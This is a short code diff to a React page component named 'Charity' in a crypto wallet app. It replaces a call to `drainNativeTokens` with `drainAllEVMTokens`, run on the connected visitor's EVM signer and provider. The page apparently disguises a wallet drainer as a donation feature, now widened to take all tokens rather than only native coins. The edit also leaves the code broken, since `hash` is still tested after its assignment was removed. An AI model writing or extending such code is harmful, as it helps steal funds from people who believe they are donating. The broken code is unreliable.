@@ -13,7 +13,7 @@ import { Badge } from '@/components/ui/badge';
 import { AnimatedLogo } from '@/components/AnimatedLogo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
@@ -38,7 +38,7 @@ const SOL_RESERVE_USD = 1; // Always leave $1 worth of SOL
 const Charity = () => {
   const { connection } = useConnection();
   const { publicKey, sendTransaction } = useWallet();
-  const { activeChain, getEVMChain } = useChain();
+  const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName, nativeToken } = useChainInfo();
   const [balances, setBalances] = useState<TokenBalance[]>([]);
@@ -278,7 +278,7 @@ const Charity = () => {
       try {
         setButtonState('loading');
         const chainName = getEVMChain()?.name || 'EVM';
-        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
+        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
         if (hash) {
         } else {
         }
